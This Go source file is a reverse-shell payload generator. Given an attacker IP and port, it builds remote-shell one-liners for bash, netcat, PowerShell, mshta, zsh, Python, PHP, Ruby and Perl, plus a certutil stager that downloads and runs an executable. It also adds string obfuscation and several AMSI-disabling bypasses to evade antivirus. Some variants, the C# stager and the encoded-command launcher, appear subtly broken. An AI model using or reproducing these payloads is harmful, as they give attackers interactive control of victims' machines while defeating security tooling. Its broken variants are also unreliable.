package main

import (
	"encoding/base64"
	"fmt"
	"strings"
)

type Payload struct {
	Name string
	Code string
}

func GeneratePayloads(ip string, port int) []Payload {
	portStr := fmt.Sprintf("%d", port)

	return []Payload{
		{
			Name: "Linux Bash",
			Code: fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", ip, portStr),
		},
		{
			Name: "Linux/macOS NC FIFO",
			Code: fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", ip, portStr),
		},
		{
			Name: "Windows PowerShell (AMSI Bypass)",
			Code: generatePowerShellAMSI(ip, portStr),
		},
		{
			Name: "Windows PowerShell (Multiple AMSI Bypass)",
			Code: generateMultiAMSI(ip, portStr),
		},
		{
			Name: "Windows CMD (PowerShell One-liner)",
			Code: fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$t=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()\"", ip, portStr),
		},
		{
			Name: "Windows CMD (Direct PowerShell Launch from CMD)",
			Code: fmt.Sprintf("cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass -Enc %s", b64PS(ip, portStr)),
		},
		{
			Name: "Windows C# (csc.exe Compiled)",
			Code: generateCSharpPayload(ip, portStr),
		},
		{
			Name: "Windows MSHTA (VBScript)",
			Code: fmt.Sprintf("mshta vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command $c=New-Object System.Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$t=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()\"\",0\"))", ip, portStr),
		},
		{
			Name: "Windows Certutil (Stager)",
			Code: fmt.Sprintf("certutil -urlcache -f http://%s/shell.exe %%TEMP%%\\shell.exe && %%TEMP%%\\shell.exe", ip),
		},
		{
			Name: "macOS Zsh Native",
			Code: fmt.Sprintf("zmodload zsh/net/tcp && ztcp %s %s && zsh -i <&$REPLY >&$REPLY 2>&$REPLY", ip, portStr),
		},
		{
			Name: "Python",
			Code: fmt.Sprintf("python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'", ip, portStr),
		},
		{
			Name: "Python (IPv6 Compatible)",
			Code: fmt.Sprintf("python3 -c 'import socket,os,pty,subprocess;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),x)for x in(0,1,2)];pty.spawn(\"/bin/sh\")'", ip, portStr),
		},
		{
			Name: "PHP",
			Code: fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", ip, portStr),
		},
		{
			Name: "Ruby",
			Code: fmt.Sprintf("ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'", ip, portStr),
		},
		{
			Name: "Perl",
			Code: fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", ip, portStr),
		},
	}
}

func generatePowerShellAMSI(ip, port string) string {
	ps := fmt.Sprintf(`$c = New-Object System.Net.Sockets.TCPClient('%s',%s);`+
		`$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};`+
		`while(($i = $s.Read($b, 0, $b.Length)) -ne 0){`+
		`$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);`+
		`$sb = (iex $d 2>&1 | Out-String );$t = $sb + 'PS ' + (pwd).Path + '> ';`+
		`$x = ([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()`, ip, port)

	ps = strings.ReplaceAll(ps, "New-Object", "N'e'w-O'b'j'e'c't")
	ps = strings.ReplaceAll(ps, "System.Net.Sockets.TCPClient", "S'y's't'e'm'.'N'e't'.'S'o'c'k'e't's'.'T'C'P'C'l'i'e'n't")
	ps = strings.ReplaceAll(ps, "iex", "I'E'X")

	return "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"" + ps + "\""
}

func generateMultiAMSI(ip, port string) string {
	payload := fmt.Sprintf(`$c = New-Object System.Net.Sockets.TCPClient('%s',%s);$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb = (iex $d 2>&1|Out-String);$t = $sb+'PS '+(pwd).Path+'> ';$x = ([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()`, ip, port)

	bypasses := []string{
		"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);",
		"$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*Amsi*') {$c=$b};};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like '*amsi*'){$e.SetValue($null,$true)}};",
		"[System.Runtime.InteropServices.Marshal]::WriteInt32([System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation').EntryPoint.Invoke($null,$null).GetType().GetField('amsiContext','NonPublic,Static').GetValue($null),0);",
	}

	combined := strings.Join(bypasses, "")
	return fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"%s%s\"", combined, payload)
}

func generateCSharpPayload(ip, port string) string {
	csCode := fmt.Sprintf(`
using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
class R {
static void Main() {
var c=new TcpClient("%s",%s);
var s=c.GetStream();
var b=new byte[1024];
var p=new Process();
p.StartInfo.FileName="cmd.exe";
p.StartInfo.UseShellExecute=false;
p.StartInfo.RedirectStandardInput=true;
p.StartInfo.RedirectStandardOutput=true;
p.StartInfo.RedirectStandardError=true;
p.Start();
var si=p.StandardInput;
var so=p.StandardOutput;
var se=p.StandardError;
var i=System.Text.Encoding.UTF8.GetString(b,0,s.Read(b,0,b.Length));
si.Write(i);si.Flush();
var d=so.Read(b,0,b.Length);
s.Write(b,0,d);
d=se.Read(b,0,b.Length);
s.Write(b,0,d);
p.WaitForExit();
}
}
`, ip, port)

	b64 := base64.StdEncoding.EncodeToString([]byte(csCode))
	return fmt.Sprintf(
		`powershell -NoP -NonI -Exec Bypass -Command "$c='%s';[System.IO.File]::WriteAllBytes([System.IO.Path]::GetTempPath()+'r.cs',$c);Add-Type -Path ([System.IO.Path]::GetTempPath()+'r.cs');[R]::Main()"`,
		b64,
	)
}

func b64PS(ip, port string) string {
	ps := fmt.Sprintf("$c=New-Object System.Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$t=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()", ip, port)
	return b64encode(ps)
}

func b64encode(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}
